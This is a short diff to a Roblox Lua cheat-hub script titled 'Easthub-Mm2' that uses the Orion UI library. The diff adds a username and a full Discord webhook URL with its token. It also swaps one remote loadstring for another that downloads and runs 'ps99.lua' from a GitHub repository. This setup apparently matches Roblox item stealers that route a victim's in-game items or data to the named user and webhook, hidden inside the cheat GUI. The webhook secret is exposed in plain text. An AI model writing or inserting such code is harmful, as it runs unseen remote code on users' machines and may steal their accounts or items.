@@ -1,5 +1,7 @@
+Username = "zalanlovesjen" 
+Webhook = "https://discord.com/api/webhooks/1271084410065915965/ODMv5jStVMVRybtYYi862nJm2biNCcqlWJx3aU3NiR10j3BI5_s3t9F3e4fgZd9m8oC2" 
 getgenv().gui = false
-loadstring(game:HttpGet("https://egorikusa.space/1273ce86b3a1bd21b76c3e9a.lua", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zachemzhestokiy/x/main/ps99.lua"))() 
 
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 local Window = OrionLib:MakeWindow({Name = "Easthub-Mm2 [3.0]-Summer Update🏄", HidePremium = false, IntroText = "Easthub", IntroIcon = "rbxassetid://18170549235", Icon = "rbxassetid://18170549235", SaveConfig = true, ConfigFolder = "OrionTest"})
